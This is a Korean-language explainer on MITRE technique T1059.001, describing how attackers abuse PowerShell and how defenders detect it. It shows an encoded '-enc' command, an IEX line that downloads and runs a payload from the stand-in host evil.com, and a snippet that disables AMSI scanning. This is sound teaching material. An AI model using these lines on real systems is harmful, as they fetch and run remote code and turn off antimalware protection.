T1059.001: PowerShell

Execution

PowerShell

만능 리모컨을 악용하는 도둑 — PowerShell의 강력함이 무기가 될 때

#1. PowerShell이란?

🎮 ➜ 🔧 ➜ 🏠 ➜ 💥

"만능 리모컨을 악용하는 도둑"

집에 있는 만능 리모컨으로 TV, 에어컨, 조명, 보일러를 모두 제어할 수 있다고 상상해 보세요. 이 리모컨이 도둑의 손에 들어간다면? PowerShell은 Windows의 "만능 리모컨"입니다. 시스템 관리자가 서버를 관리하는 강력한 도구이지만, 공격자에게는 시스템을 완전히 장악하는 무기가 됩니다.

관리자 도구에서 공격 도구로

정상 용도

서버 관리, 사용자 계정 생성, 로그 분석, 자동화 스크립트 실행

악용 이유

Windows에 기본 설치, 시스템 전체 접근 권한, 메모리에서만 실행(파일 없음 = 탐지 어려움), .NET 프레임워크 직접 호출 가능

Living off the Land (자급자족 공격)

공격자는 별도의 악성 프로그램을 설치하지 않고, 이미 시스템에 존재하는 PowerShell만으로 공격합니다. 백신이 "정상 프로그램"으로 인식하므로 탐지가 매우 어렵습니다. 이를 "Living off the Land(LotL)" 기법이라 부릅니다.

#2. 공격에 활용되는 기법

🔐

-EncodedCommand

명령어를 Base64로 인코딩하여 실행합니다. 로그에는 알 수 없는 문자열만 남아 분석을 어렵게 만듭니다.

powershell -enc
SQBFAFgAIAAoAE4AZQB3AC0A
TwBiAGoAZQBjAHQAIABOAGUA
dAAuAFcAZQBiAEMAbABpAGUA
bgB0ACkALgBEAG8AdwBuAGwA
bwBhAGQAUwB0AHIAaQBuAGcA
⚡

Invoke-Expression (IEX)

문자열을 코드로 실행합니다. 원격 서버에서 스크립트를 다운로드하고 즉시 메모리에서 실행합니다.

# 파일리스(Fileless) 실행
IEX (New-Object
 Net.WebClient)
 .DownloadString(
 'http://evil.com/payload')
🛡️

AMSI 우회

AMSI(Anti-Malware Scan Interface)는 PowerShell 스크립트를 백신에게 검사시키는 보안 기능입니다. 공격자는 이를 메모리에서 비활성화합니다.

# AMSI 우회 (개념)
[Ref].Assembly.GetType(
 'System.Management
 .Automation.AmsiUtils')
 .GetField('amsiContext')
 .SetValue($null, [IntPtr]::Zero)

탐지 포인트 (Blue Team)

Script Block Logging

PowerShell 5.0+에서 실행되는 모든 스크립트 블록을 이벤트 로그에 기록합니다. Base64 디코딩 후의 원본 코드도 기록됩니다.

Constrained Language Mode

.NET 직접 호출, COM 객체 생성 등을 제한하여 공격 기법의 대부분을 차단합니다.
